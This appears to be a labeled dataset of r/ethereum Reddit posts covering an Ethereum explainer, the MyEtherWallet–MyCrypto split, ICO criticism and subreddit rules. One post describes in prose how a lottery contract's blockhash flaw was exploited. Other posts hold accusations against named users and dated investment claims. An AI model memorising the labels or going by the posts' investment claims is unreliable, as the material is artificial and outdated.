"hello r/ethereum - i'm currently in singapore exploring all of the cool blockchain tech that's going on here. i'm also writing a blog that aims to explain blockchain technology simply to anyone whose interested. www.cryptoambit.com if you guys could spot check my ethereum post for accuracy, i'd appreciate it. if you like it, would also appreciate some subscribers! thanks _____________________________________________ by now, most people know ethereum as the second most valuable cryptocurrency, currently valued at over $60 billion dollars. well, it turns out that ethereum isn't actually a cryptocurrency - it's a software platform that let's programmers build applications on top of blockchain technology. within the ethereum platform, is a cryptocurrency called ether that is used to power applications built on the ethereum blockchain. **from bitcoin to ethereum** bitcoin uses a global network of computers that maintain a shared ledger called a blockchain that keeps track of who owns bitcoin. once blockchain technology was introduced to the world, people realized that blockchains could be used to keep track of anything of value. in 2013, a 19 year old named vitalik buterin introduced the ethereum white paper, which proposed an open source platform that would let programmers build blockchain applications that could facilitate the exchange of money, content, property, shares or anything of value. much like with satoshi nakamoto's paper, buterin's was met with widespread excitement from software developers around the world who began building toward the vision buterin laid out. much like bitcoin, ethereum isn't owned or controlled by any one person. unlike bitcoin, whose creator remains anonymous, ethereum has a leader in vitalik buterin (pictured below). while buterin doesn't control ethereum in the way that a ceo does, his word carries tremendous weight in dictating the direction of the project - something that is considered a strength or a weakness, depending on who you ask. **smart contracts** the basic function that programs built on ethereum perform are called smart contracts. smart contracts are digital agreements that execute automatically based on real world data. an easy way to think of them is an ""if-then statement."" if condition a exists, then perform function b. let's say for example grandma wants to make sure she never forgets to give little billy birthday money each year. she could write a smart contract that says if it's little billy's birthday, then pay him $10 from grandma's account. once this contract is broadcast to the ethereum network, it will execute automatically each year on little billy's birthday. smart contracts have applications far beyond improving the reliability and efficiency of grandmothers around the world. another simple application of a smart contract is for rental payments: if date = 1st of the month, then pay landlord rent amount. processes that currently involve manual interactions between two parties can now be automated and the value can be moved in real time over the blockchain rather than settling days later as with traditional banking. **a real world example** ethereum and smart contracts are a big deal because they have the ability to usher in what's been dubbed the ""smart economy"" - one in which slow manual processes prone to human error and deceit are replaced with automated processes that are completely transparent and trustworthy. a real world example that typifies the new ""smart economy"" is a project being run by a french insurance company called axa. axa offers a flight insurance product that pays out a policy holder in the event that a flight is delayed by two hours or more. it currently has a product in trial that will pay out insurance claims using smart contracts and the ethereum blockchain. the smart contract is simple: if flight is over two hours late, then pay policyholder. the smart contract is connected to a database that monitors flight times. if the database shows that the flight is over two hours late, the smart contract is triggered and the policyholder is paid automatically over the blockchain. without the smart contract, the policyholder would have to file a claim and wait for the insurance company's claims department to process it, which could take anywhere from 1 to 2 weeks. with the smart contract, neither the insurance company nor the policyholder has to do anything. this also creates trust between the two parties because there are no grey areas - the customer can review the smart contract prior to purchasing the policy and feel comfortable that he will receive his claim in the event of a delay. **ethereum vs ether** as stated in the intro, ethereum is a platform for building blockchain applications using smart contracts. what you may have just purchased on coinbase is called ether, which is the cryptocurrency that fuels the ethereum network. ether functions more like a digital commodity than a digital currency. just like you need gasoline to fuel your car, you need ether to run applications on the ethereum blockchain. in the grandmother example cited above, grandma would have to purchase small amounts of ether to fuel her smart contract that pays little billy his birthday money. the ethereum blockchain functions in the same way as the bitcoin blockchain: a network of computers run software that validates transactions through majority consensus. the people running these computers are called miners. bitcoin miners are compensated for their resources by being paid in bitcoin. ethereum miners are compensated in ether. on little billy's birthday, grandma's ether transaction fee will go to whichever miner adds the block containing grandma's transaction to the blockchain. that miner will also receive new ether in the process. the same supply/demand economics that apply to commodities like oil and gas also apply to ether. oil is valuable because it powers many of the things we use in our everyday life - it heats our homes and fuels our engines. the more people and enterprises that rely on ethereum based applications, the higher the demand will be for ether which will increase its value. as with all cryptocurrencies, there's plenty of speculation baked into the price - speculation that the demand for ether will increase in the future. since ether is valuable, exchangeable and transferable, certain merchants are also starting to accept it as a currency. **dapps - decentralized apps** applications that run smart contracts on the ethereum blockchain are called ""dapps,"" or decentralized apps. just as any app developer can build apps on top of apple's ios operating system, developers can build on top of ethereum's blockchain infrastructure. to the end user of a dapp, it might not look and feel any different than the apps you use today. it's the underlying blockchain infrastructure that make them different. since dapps function on top of the blockchain, they can be used to transfer value peer-to-peer. to return to our grandmother example, there could be a dapp that granny can download that lets her schedule little billy's birthday payments without having to code the smart contract herself. dapps are also completely open sourced so other people can access the code and build on top of them. someone could take the code to the birthday payment dapp and add the ability for grandma to add a note that says, ""happy birthday billy!"" running dapps on the blockchain also offers added security benefits. since the transactions are distributed and encrypted across the ethereum blockchain, there is no central place for a hacker to breach and gain access to all of the world's grandmother to grandson birthday payment data. at this point, i'm really beating the grandmother/little billy example to death because i think it represents a simple illustration for the kinds of applications that can be built on the ethereum blockchain. in reality, the dapps that are being built are much more complex. here are a few examples: * **weifund - blockchain crowdfunding:** users can launch traditional crowdfunding campaigns, but through the use of smart contracts, backers can gain a financial stake in the project. if an indie film gets funded on weifund, a backer who financed 10% of the project can collect 10% of the film's revenues. payments will be issued in real time as the film generates revenue. * **ujo music - music licensing via the blockchain:** an artist can create an original song and register it on ujo's platform and set their own licensing terms. if a film producer wants to use that song in a movie, they can purchase the rights based on the terms set by the artist who will then get paid directly. this erases the need for industry middlemen like warner brothers who end up taking the lion's share of their artist's profits. * **virtue poker - online poker secured by the blockchain:** at the height of it's popularity, online poker platforms like pokerstars were marred with issues that ranged from deck rigging to the abuse of player funds held by the company. virtue poker using ethereum allows players to fund their bets directly, insuring that no central party can access and misappropriate player money. their code is open sourced so that users can understand how hands are dealt, insuring that no one can rig the deck. lastly, players are paid out their winnings in real time over the blockchain so no more waiting weeks for a check to come in the mail. **ethereum tokens** so now that you understand that ethereum is a network for building decentralized applications that require a cryptocurrency called ether to run, i'm going to introduce a confusing concept. many dapps built on ethereum have their own cryptocurrencies or ""tokens."" in order to interact with the dapps, customers need to purchase the dapp's native token. here's a helpful analogy i came across - when you go to a waterpark, you pay the admission fee and in return, you get a wristband. that wristband gives you the ability to ride the waterslides in the water park. with certain dapps, the token is the wristband, and a user must purchase it to interact with whatever the dapp offers. let's take a dapp called golem as an example. golem lets people rent out their excess computing power to people who need it - kind of like a computer airbnb. to cite this article from laura shin, if i'm a computer graphics artist that wants to render some kind of computationally intense animation, i can purchase golem tokens that let me tap into the golem network to generate my animation. i then pay the people who are renting me their computers with the golem tokens. the golem token is a form of smart contract and this transaction is recorded on the ethereum blockchain. since golem tokens are also a cryptocurrency, they can be traded on the free market. if i'm a speculator who has no intention of using the golem network to rent computing power, i can still buy the golem token on an exchange in hopes that it appreciates in value. like bitcoin, there is a fixed supply of golem tokens so if the demand for the service increases, so will the value of the token. if i bought golem at its original price of around 1 penny and held it to today, i would have made 35x my initial investment since golem tokens currently trade around 35 cents a piece. **icos** ico stands for, ""initial coin offering"" which is a fundraising mechanism for cryptocurrencies which has exploded in popularity this year - the majority of them are held on the ethereum network. similar to a kickstarter campaign, they allow entrepreneurs to raise money for projects by giving investors an early opportunity to purchase the cryptocurrency before the final product has been built. if the project is successful, the value of the cryptocurrency will rise in value and early investors can sell it on the open market for a profit. icos have stirred up a lot of controversy because they represent a risky proposition with zero investor protection. let's say i wanted to build a casino and to finance it, i gave investors the opportunity to buy chips that can be used at my roulette tables once the casino opened. if you bought $100k in roulette chips from me and i decide that i no longer want to build the casino, you're stuck holding worthless chips. if investors don't do their due diligence, they may end up buying tokens for a project whose creators never intended on building it in he first place - the creators walk away with the money and the investors have no way of recouping their funds. on the other hand, early investors in projects that go on to be successful have the opportunity to make enormous returns. for example, people who invested $1,000 in the golem ico would be sitting on $35,000 at it's current price of $0.35 - if it ever goes to $10, they're all millionaires. another positive aspect of icos is that they let anyone, rich or poor get involved in early stage investing. to invest in a company like twitter or facebook pre-ipo (initial public offering), you need to be an accredited investor - this basically means you're already a rich person. with icos, all you need is an internet connection and a little bit of money and you have the potential to become wealthy by investing in the right projects. **far from perfect** ethereum has the potential to change the way humans transact with one another but it is still a very young technology and it hasn't been without its problems. while the blockchain architecture underlying the ethereum network is secure, not all of the applications built on top of it are. faulty code can and has made applications vulnerable to hacking and malfunctions. here are two prime examples: **dao hack** - dao was a dapp built on ethereum that enabled crowd based venture capital. dao token holders were given the right to vote on projects they wanted to support - if projects went on to be successful, dao token holders would receive financial rewards. the dao ico received $168 million in funding. the dao software was hosted on the ethereum blockchain and was publically visible by all. a hacker spotted a flaw in the dao's code that enabled him to route $55m in ether held by the dao into an account that he controlled. the ethereum team had do do something called a hard fork (something i won't get into now) to reverse return the stolen funds. **parity wallet freeze** - parity is a wallet where people store ether. a flaw in parity's code let a user delete a specific line of code that was necessary for accessing funds in a parity wallet. this led to $280 million dollars worth of ether being frozen - it hasn't been stolen but it can't be accessed either. parity technologies has proposed another hard fork to correct the issue - something that is sure to divide the ethereum community and rattle user confidence. despite the world changing implications that ethereum dapps and smart contracts have, the trouble is that any programmer can write them - if they aren't written properly, they can behave in unintended ways and be exploited like in the above listed examples. ethereum is still a very young network and security issues with dapps and smart contracts will have to be sorted out if its to reach its true aspirations. **leading the decentralized revolution** “ethereum aims to take the promise of decentralization, openness and security that is at the core of blockchain technology and brings it to almost anything that can be computed.” - vitalik buterin with dapps, smart contracts and blockchain technology, ethereum is leading the decentralized revolution. bitcoin is the world's first decentralized currency, that operates on a global network of computers outside of central intermediaries. ethereum gives programmers a platform to develop a decentralized version of just about anything. decentralized networks like ethereum have the power to remove the intermediaries that currently exist between producer and consumer. let's take a company like uber. uber is a platform that brings people who need rides together with people who have cars. to facilitate this interaction, uber collects 20% of every ride. with ethereum and blockchain technology, there is nothing to prevent a bunch of software developers from writing a dapp that creates a decentralized uber. instead of 20% per ride, transaction fees are paid to the network and the driver takes home the lions share of the transaction. tokens can be issued that represent ownership in the network. coders who work on improving the network can get paid for their efforts in ownership tokens. non-technical people can come up with marketing campaigns that spread awareness for the network and also get compensated in ownership tokens. as the decentralized uber network grows and improves, the value of its ownership token increases, rewarding the people that built it. the result is whats referred to as a ""decentralized autonomous organization"" and theres a strong possibility that daos replace a lot of the world's biggest corporations. this may sound like a radical concept but blockchain technology enables these kinds of decentralized organizations to exist - ethereum provides the tools for people to go out and build them."	1

official statement regarding yesterdays' events and status of [myetherwallet](https://www.myetherwallet.com) hello everyone, by now, you may have already read the article at [medium](https://medium.com/mycrypto/mycrypto-launch-6a066bf41093). for those of you who do not know me, i founded myetherwallet (“mew”), and i believe that i owe our ethereum community, and the crypto community at large, an explanation of yesterday’s events. before i do, a brief history about me: i’ve been intrigued by ethereum ever since the release of their yellow paper back in 2014. upon reading it, i realized that vitalik was a true visionary and became infatuated with the technology behind ethereum. specifically, i understood all the transformative possibilities that this type of technology presented now and in the future. when the ethereum foundation released the “mainnet,” however, i recognized that many users were struggling. with no graphical user interface, many early adopters were having difficulty accessing and transferring their ether. i saw an opportunity to contribute to this new, emerging community, and seized it. i began working on a user interface to be used in conjunction with, and in support of, ethereum wallet functionality that any new crypto adopter could feel comfortable using. i released my initial version, and published it on [reddit](https://www.reddit.com/r/ethereum/comments/3gkknd/ether_wallet_generator_for_now/) on august 11, 2015 (mew’s birthday!). i designed it to be open source so that others like me could make modifications to my existing codebase, and continue improving user-friendliness and functionality over time. however, as a core developer and programmer, business development/designing were, admittedly, not my strength. i needed someone to take the lead on that front if i wanted mew to grow its userbase. i brought my friend, taylor m., on board knowing that she was up to the task. let’s just say that she did not disappoint, and mew took off much faster than either of us could have anticipated. i will always be appreciative of her efforts in helping mew achieve the success it did. alas, for reasons i cannot delve into here, our partnership had to end. during the transition yesterday, however, mew’s twitter account was switched from @myetherwallet to @mycrypto, and tens of thousands of mew followers were left scratching their heads. indeed, the change was unexpected, and i’m still in the process of determining the justification behind the switch, and how this issue will be resolved. i don’t know what the fall out from this will be ultimately, but i will not be on the offensive or defensive discussing the circumstances surrounding our decision to separate beyond my statement here. instead, my focus will be (as it’s always been) on how best to improve mew for existing and prospective users. security is paramount these days, and me and my new team will remain vigilant in ensuring that the mew website, your accounts, and more importantly, your ether and tokens, are safe. rest-assured that mew is the same product that you trusted yesterday, and the mew team will work tirelessly to make sure it is the product you still trust tomorrow. the ethereum community inspired me to create myetherwallet, and it still inspires me today. i am not going anywhere. furthermore, for those of you wondering where i’ve been or what i’ve been working on the past several months, i’ve been busy doing what i do best—so get ready for some new and exciting products/services in the pipeline. stay tuned! in any event, i must admit that competition is a good thing because it serves as a driving force behind innovation. look at the world around us. complacency simply means one will get left behind. that being said, i sincerely wish taylor m. and mycrypto the very best. your presence in the crypto space will undoubtedly motivate me to continue raising the bar. thank you all for your support over the last few years, and hopefully, in the years to come. mew’s team remains committed to you, and is available to answer any and all questions or concerns you may have. truly yours, kosala h. kvhnuke	1
## we did it! thank you /r/ethereum ##**this is not an accusation** my name is alex. last week i interviewed with coinbase. for the past three months my friends and i have been donating work to a charity project designed to perpetually fund charitable organizations. i consider this amazing serendipity. i am very excited. so, i am asking for your help getting this to his attention. i have filled out the form in the blog post, emailed through earn.com, replied to the blogkmessaged /u/bdarmstrong and i emailed my recruiter directly. i believe in being thorough, below is a description of our project. ##**this is not an accusation** **original post:** https://www.reddit.com/r/ethereum/comments/7teto5/brian_armstrong_coinbase_ceo_proposing_a/dtcvk21/ **tldr:** https://igave.io/whitepaper.pdf https://igave.io/demo https://github.com/i-gave # i gave - a decentralized autonomous charitable organization to perpetually fund charity operation costs raising donations for operations costs is the most challenging obstacle for charitable organizations. i gave is a dao for funding charity operation costs. all ether raised in the ico will go to donations that grow non-profit organizations. a monthly vote by igv token holders will decide the recipients. the i gave dapp is a smart contract for charitable fundraising. fundraisers issue erc-721 digital assets representing donation items. tokenizing charitable donations creates a decentralized philanthropy market. a metamask enabled embedded html snippet allows anyone to accept ether donations on behalf of charity on their website. philanthropists purchase the erc-721 tokens to make their donation. web3 provides donor token holders new web experiences based on their donations. # problem large charities need funding to keep their organizations running. they must pay employees, raise funds, incur building costs, and marketing. even then, donors must trust their money is well spent. these investments in themselves are often, wrongly, stigmatized. **from 1970 to 2009 the number of nonprofits to cross the $50m revenue barrier is 1441.** the number of for-profit was 46,136. why are nonprofits incapable of capturing market share? money is the symptom. social dogma is the problem. it is taboo to profit from helping others. the things we are taught to think about giving and philanthropy and charity undermine the causes we love. we have no problem with someone making millions of dollars selling widgets but make half a million dollars curing sick kids and you risk character assassination. philanthropists prefer their gifts go to the needy. it’s a difficult problem explaining that marketing benefits the needy. a donation that grows an organization can help tens or hundreds more. risk is also heavily scrutinized. a hollywood movie can cost millions and flop at the box office. if a charity ceo fails to deliver a return in a short period of time they may lose their career. without the ability to take risks, entrepreneurs cannot generate innovation in the space. # offer / solutions ##### decentralized philanthropy market tokenizing charitable donations creates a new commodity. philanthropists can shop for donations. we've created an embedded donation button. once a charity issues a token supply anyone in the world may add our script to their page, decorate html elements and begin accepting donations on behalf of charity. there are no middleman fees, the buttons interact directly with the smart contract. this allows brands, shops, celebrities - anyone - to style the button to match their brand, to create their own lists and markets for giving. it is completely customizable with css. ##### monthly dao allowance the ico contract will place 100% of ico funds in a voting contract controlled by token holders. each month, the contract will unlock a portion of funds. each token may direct the funds to a charity address on a whitelist. charities will petition the dao to be added to the list. the dao will determine eligibility and criteria. dev funds will follow the recently proposed daico model. ##### ecosystem of dapps the first i gave dapp supports creating charity campaigns, issuing tokens (tokenizing donations), automatic 501c tax certificates, a donation portfolio, and a tracking dashboard. 1% of all donations made on the dapp are added to the monthly dao allowance. ##### erc-721 token voting we intend to give donors voting rights in the dao. in time, as the number of donors increases, the erc-721 donor token values will eclipse the original ico token values. the flippening will occur and philanthropists who have given will eventually have more votes than the ico token holders. the philanthropists will inherit this project. at no time are ico funds controlled by myself or anyone on the project. everything is handled through smart contract. # progress 1. the dapp is available to demo. https://igave.io/demo 2. the embedded donation button is available to demo. https://igave.io/embedded/3/1 3. we have a team of around five people. most of the developers are former bitpay employees. 4. we've begun reaching to charitable organizations through our charity advisor to begin onboarding. # who are you? this is me: https://www.linkedin.com/in/alexsherbuck/ i was working at bitpay until the beginning of this month when i started doing this project full time. # crypto-philanthropist manifesto in less than ten years we've built ourselves a reputation as drug dealers, money launderers, terrorists, and scammers. whether it’s true, or not. this project means to challenge our community. the double standard set for non-profits incites the same feelings i felt getting into cryptocurreny in 2012. these organizations are our allies. no one innovates in their space. it's very easy to empathize with organizations who are already pushed to the brink. they can't take the risk. we can. but we have pushed ourselves to the point where people will take our money but are dubious to associate with us. solving the tech debt with scaling is not the end of our race. there are mountains of debt in reputation, brand, customer service and user experience. we've created a bubble. not with the price but with the direction we're all heading. when the market finally corrects we may not recover. this project is not a part of the crypto gold rush. if anything, we are going in the opposite direction. this is a chance to show the power this technology has to affect change. **if we want to build the world we want to live in we have to prove that the tools we use can do it better than those that came before.**	2

i noticed this ico pop up on a couple of my social media feeds so went and had a look, mainly because they are lauding vitalik buterin as a team member... the website to be fair is half decent and could reel in some unwitting newbies but i also remember vitalik stating he was distancing himself from any new projects going forward so i was skeptical.. then i watched 'their' promo video, which if you take the 1:40 to watch it (youtube link below) you will see that whenever the company name is mentioned the audio cuts out. not sure which project the vid is from but its not this one!!! plus, would an ico like this be under the radar.....? no. thought i should share this so that people aren't duped into sending money to a scam ico. if i have this wrong, please convince me otherwise, but this is super shady imo. https://www.othor.org https://www.youtube.com/watch?time_continue=84&v=fwmihbholb4 https://medium.com/@othororg/ico-alert-report-othor-e8c6bae545c4	1

someone made it in the “hackathon” (lol). the hacker could withdraw 400 eth before the owners, who wrote “the successful hacker keeps all of the 1500 eth reward”, withdrew quickly the remaining 1100 eth, that happened 5min before the next transaction (from the “hacker”) would have emptied the whole contract. so that’s already a lie from their side. the other point is that the owners were able to withdrew all contract funds; which in theory they could have done after ico and run with all the investor money. they always remained anon, which also shows there weren’t good intentions in first place. how did it happen? their lottery functions were flawed, if you place a bet (systemplay() function) with betting on number value “0” and then call the won() function after 256+ blocks (after you placed the bet) the returning value will be “0” so you would have bet on “000000” and result would be “000000” and baaam you have the jackpot. the lucky guys first bet was “1” so “000001” and result after 256+ blocks calling won() would be “000000” so he matched 5 correctly which is 20000x and with 0.01eth bet amount a win of 200eth. he managed to pull that 2 time and corrected to “0” and for that transaction he had to wait for 256+ blocks, but 5 min before he could call won() the owners withdraw all funds. moral of the story, that ico was a scam seeing the owners remains anon all the time and were able to withdraw all contract funds (doing that after ico would have been fatal for investors). they thought they are clever, building a honeypot for investors but at the end their poor coded contract caused them damage of 400eth and no damage to potential investors. contract: https://etherscan.io/address/0x5ace17f87c7391e5792a7683069a8025b83bbd85 page: https://smartbillions.com	1

^(title comes from a comment by u/wwwwwwwwwwwwwwwwww1) i feel that this is the most sensible argument in the debate on whether or not to hard-fork this issue away. it's simply not worth it to damage ethereum's credibility.	1

headeredit: as confirmed by /u/kvhnuke [this is the 'new/old' official mew twitter handle](https://twitter.com/myetherwallet). if you followed him before, you'll have to follow him again since all his followers were transferred over to a competing project without consent. ___________________ dodging the most obvious question: https://www.reddit.com/r/ethereum/comments/7wa7yh/a_new_beginning_mycryptocom/dtyycvp/ confirmation /u/kvhnuke didn't know anything about the re-brand and didn't authorize the namechange of the twitterhandle: https://www.reddit.com/r/ethereum/comments/7wa7yh/a_new_beginning_mycryptocom/dtyvt9d/ it appears as if they got vc funding from outside sources: https://www.reddit.com/r/ethereum/comments/7wa7yh/a_new_beginning_mycryptocom/dtz16im/ if this is a money grab, please for the love of crypto and all that is holy, support mew not those that took over a twitterhandle of an existing and ongoing ethereum project, shunning their partner and sell out to big money! edit: looks like their shillarmy is out already downvoting posts asking for clarification and uncomfortable questions. edit2: just wanted to clarify that i have nothing to do with the 'petition' to remove u/insomniasexx as a mod which calls her a thief. while i do agree that the mod-team needs to be cleansed from her (and possible others) we should not call names. edit3: as pointed out by /u/krazymanrebirth those blindly following /u/insomniasexx should have a brief peak at her [reddit history](https://www.reddit.com/r/ethereum/comments/6b1btx/trouble_finalizing_ens_auctions_mew/dhj5z0s/) > no. shut the fuck up. this is fucking crypto and you are literally sitting here saying that you fucking failed to check the tx hash because you trust us. this is crypto and no one should trust anything. if you were blindly going to send money, um, use a bank? they can afford to refund you at least and have insurance in case you fuck it up. ^^this ^^is ^^just ^^a ^^short ^^excerpt ^^- ^^read ^^the ^^whole ^^yourself. edit4: looks like this was an orchestrated attack not only to strip mew off of their twitter handle but also off of their reputation. excerpt from etherscamdb.info: > we recommend using mycrypto.com moving forward for any interactions with the ethereum blockchain. we no longer recommend mew. thank you! wondering who runs etherscamdb.info? yeah you guessed it right: > the database was created in 2017 by #teammew when trying to find a solution to the ethereum scams. of course grouping all the scams won't make them go away, but it will make identifying them and taking them down easier. it is now being maintained by the mycrypto team. this is not only shady in light of what's going on here, but would be seen as shady in the business world even if mew and mycrypto weren't coming from the same source/team. thanks to /u/jokl66 edit5: quoting /u/kvhnuke who confirms again that the complete situation was unexpected. he is preparing a statement. > yes i hear all of you, and i do want everyone to know both side of the story. however, i have to say current situation is totally unexpected. thats why i dont have a post ready to go	1
and i mean really technical. too many thinly veiled ico/poject pump threads. even if it means we have fewer topics, icos and project chatter need to to find their own places to shill. r/ethereum should be for eips, dev updates, questions from new and old timers and politicking about gas prices (or whatever is of flavour of the month wrt scaling, casper, technical hurdles, etc.). - it should not be about omisego, although it can be about plasma implementaions / progress / testnets. - it should not be about augur, although it could be about futarchy and game theory. - it should not be about makerdao, but it could be about the design of stable coins. more policing in here is needed. we're closing in on eternal september and up/down votes aren't cutting it anymore. the old timers are getting tired of reading drivel and the newcomers are getting the wrong impression about what this sub is for. perhaps, new and more active mods on the roster would assist, along with some clearer rules (like if the project name is in the title, it's probably an advertisement and not about the tech, or something to that effect).	1

"[**vitalik buterin's statement to techcrunch:**](https://techcrunch-com.cdn.ampproject.org/c/s/techcrunch.com/2018/01/15/vitalik-buterin-fenbushi-capital-exit/amp/) ""2017 really has been the year where hype in crypto, including financial hype and social hype in general has far exceeded the reality of what existing blockchain systems can offer. there is a lot of attention, and a lot of eager expectation, but as far as reality goes the practical usability of blockchains has in some cases even regressed due to rising transaction fees. i expect 2018, at least within the ethereum space that i’m best able to speak about, will be the year of action. **it will be the year where all of the ideas around scalability, plasma, proof-of-stake, and privacy that we have painstakingly worked on and refined over the last four years are finally going to turn into real, live working code** that you can play around in a highly mature form in some cases on testnets, and in some key cases even on the public mainnet. **everyone in the ethereum space recognizes that the world is watching, and we are ready to deliver.**"" *note:* ***emphasis*** *added by me.*"	1
"icos incentivize developers to increase coin value, but that's not the same thing as producing useful tools or effective dapps. thus, the coins keep coming, but they generally don't add any real utility. makerdao ~~and etherdelta are~~ is the only project i can think of that provide real use-cases *today* and used an ico to get there. when i asked the community for more examples, [the response was not encouraging](https://www.reddit.com/r/ethereum/comments/80bvc0/what_are_some_useful_dapps_that_work_today_are/). on the other hand, consider dapps like cryptokitties, gitcoin, and toastycoin, all of which launched without an ico. - cryptokitties truly broke new ground, giving every ethereum user access to a genre of entertainment we don't even have a name for yet--some bizarre marriage of day-trading and beanie babies. for the first time, i was able to show people in the real world a working dapp that was *fun*, to the point where they downloaded metamask and put some ether on it. that's a pretty big deal. - gitcoin has created a two-sided market out of nowhere, allowing developers and freelancers in oss to accelerate projects and make money, respectively. again, ethereum users now have access to a new, useful economic tool that didn't exist before. it represents a huge step forward in solving the funding problem of open source development. - toastycoin (full disclosure: my project) used novel game theory to outsource arbitrary tasks to reliable strangers while dissuading scammers, all automatically. the ethereum ecosystem now has access to a generalized, unscammable task outsourcing mechanism, which has been proven to work and is unhindered by licensing restrictions. how many ""game coin"" icos have we seen? and yet it was cryptokitties alone that was so fun it clogged ethereum *for a week*. how many icos talk about service marketplaces? and yet gitcoin is quietly listing [25 open tasks](https://gitcoin.co/explorer?q=) just waiting for developers to claim them (edit: and over 100 finished tasks!), and toastycoin generalizes the idea further to apply to any small task one human could perform for another. even better: none of these products require the user to go buy some shit coin on some random exchange they've never heard of. they just need ether and metamask, and they've got virtual kitties. boom. icos are not effective vehicles for innovation, and don't deserve the focus we've been giving them. this argument can be made historically, it can be made game-theoretically, and it can be made simply by comparing the rate of icos (astonishing) with the rate of utility growth they bring (paltry)."	2

congrats ethereans, we're over 300k strong. may we continue to grow, prosper, and spread the gospel of decentralisation :) centralisation is power. power corrupts. ethereum decentralises all the things.	2
i am in the early stages of building www.wheretospendcryptocurrency.com - a worldwide directory of businesses who accept crypto as payment. i've seen bitcoin specific websites but thought it will be easier for everyone if we can have a large database which will be filterable by each crypto. i've started with btc, ltc and eth but this will grow if/when the project grows. add your business now, and if you have any suggestions please comment and i'll see what i can do. i'm working on the site as we speak trying to re-design it so much better to use - if it's acting weird that's why.	1
updated contract - if you previously had wednesdaycoin, come wednesday you will also have the new one :) final update: wednesday is done! thank you to everyone here! and sorry if i didn’t get to send you wednesdaycoin; this exploded-way more than i could keep up with but i plan to keep it going. i have created /r/wednesdaycoin and will be talking more about wednesday coin and working potentially on a faucet or tipbot as well, so come join us there. i recommend not trying to send the coins when it is not wednesday since the transaction will go through as successful but the coins won’t actually transfer so you will lose what you spent as gas. i will still try to respond to as many questions as i can here. thanks to everyone and i hope you have had a great wednesday and see you next wednesday! _______ hey everyone, for fun and gain some experience into ethereum and smart contract development i created a (very) basic token than can only be sent on wednesdays! this is not an ico or anything and the tokens hold no value but i will be airdropping them to whomever wants some. &nbsp; i liked the idea of a token that is super specialized (only usable on wednesdays) so i ran with it. if you want some post an ethereum address (myetherewallet or metamask are good). i'll airdrop to as many posts as i can. thanks. &nbsp; contract address: 0x7848ae8f19671dc05966dafbefbbbb0308bdfabd symbol: wed decimals: 18 &nbsp; update 5: 5 mins left. i will send to everyone i can! update 4: less than 1 hour! i am trying to send to as many as possible but i know that i won't be able to send to everyone. update 3: less than 2 hours to go! i am trying to send to as many people as i can! also a great way to show your friends and coworkers how to use crypto! update 2: hey all it is a little over 8pm utc and i will continue to try to send out and respond as much as i can before the day's end. i may also get someone else to help me send some wednesday coins out to get it done faster. thanks again to everyone and don't forget to share with your friends! update: thanks everyone, i am responding and sending coins out as fast as i can! i still got a lot of coins to give out and will continue giving them out but if there is any problems with the coins sent please pm. i will be monitoring this as closely as i can for new addresses and if you don't want to post your address here, please feel free to pm me. thanks again!	1
4 people already confirmed my words. the facebook etheruem group (counting 50.000 people) is now in the hands of btc maximalists admins. they are filtering valuable content and let you post only fud. ethereum is the target of an organized attack in order to convince the people to sell (and it is working). all fud was posted, but when i post the list of eip for metropolis they don't want the people to know what ethereum is going to solve. they didn't allow state of the dapps to be posted on the group. they didn't allow me to tell to the community that a new wings forecasting is coming. only fud. 50.000 people in the hands of those idiots is a problem. i opened a new ethereum facebook page with no restrictions on posting. for the good of ethereum please: subscribe and share and post what you want, this is the only possible counterattack. https://www.facebook.com/groups/108484496468505/	1
2017 was indeed an exciting year for ethereum. i wish everyone a happy new year! if you feel like it, post your **2017 ethereum highlights** in this thread. i'm curious what your personal experiences were like. but please, respect one straightforward rule: no price discussion and no ico talk, thanks! :)	2

"support for eth/erc20 is soon going to be added to [komodo's barterdex p2p exchange](https://www.komodoplatform.com/en/technology/barterdex), after just ~2 months since concept, the first ""etomic"" swap between eth and a bitcoin-based coin (doge) has been completed on mainnet. https://github.com/dogethereum/dogerelay/issues/29 barterdex has a working beta since a few months. so far it only supported [bitcoin and a lot of bitcoin-based coins like bch, dash, ltc, zec, etc... ](http://atomicexplorer.com/?coins#/coins). barterdex works with on-chain atomic swaps. ethereum doesn't have the opcodes necessary, for this reason many projects that are working on atomic swaps with ethereum have focused on simulating the missing parts with smart contracts. komodo team has instead found a clever workaround that has rapidly led to success, it's less prone to bugs and also a lot cheaper in gas cost than all other solutions."	2

personal insults - threats of violence or attempts to organize attacks - slurs of any kind - posting people’s private information if you can't play nice with others, you will not be allowed to post here. ### ether price, market, and mining discussions discussion related to the price of ether, buying, trading, market speculation, or any other price/market talk should be posted on /r/ethtrader, a third-party subreddit not moderated by us. besides, keep mining discussion to subreddits such as /r/ethermining and obvious ico advertisements to r/ethinvestor or similar. ### duplicate threads duplicate threads may be deleted. it is up to the discretion of the mods. ### no spamming or drive by posting spamming will lead to post deletion and a possible ban. posts created by accounts that self-delete immediately will be deleted right away - no _drive by posting_. ### using multiple accounts creating multiple accounts to get around reddit or subreddit rules is not allowed and will likely result in a permanent ban. ### misleading titles posts with purposely misleading or unsubstantiated titles will be removed. ### karma & age requirements for posting submissions all post submissions should be made from accounts at least ten days old with a minimum of 20 comment karma. this is to keep trolls and spam-bots to a minimum. exceptions may be made on a discretionary basis; please do not message the mods for more information. --- ## moderation philosophy --- /r/ethereum is a place for the open discussion about the ethereum software, protocol, distributed applications, and related technologies. as moderators, we are here to make sure the conversation stays civil and productive. we will not censor posts based on personal ideology and welcome constructive discourse. ### what we ask our users - please utilize the up-vote and down-vote buttons. this is a built-in moderation tool that is very powerful. - if you submit a report about a post or comment, please provide as much detail as possible to help us more quickly sort through our reported posts/comments. - please don’t report posts or comments you disagree with, only about things that break the rules. - we welcome discussions about other crypto-currencies and ethereum implementations, but if the topic is already being extensively covered by other threads, we kindly ask you to consider posting it to a more specific subreddit. you can check an extensive (but not comprehensive) list of ethereum-related subreddits on the [""all ethereum"" multireddit](https://www.reddit.com/user/all_ethereum/m/all_ethereum). ### moderation logs the moderation logs are [public and available for review here](http://snew.github.io/r/ethereum/about/log). --- ## faq --- -

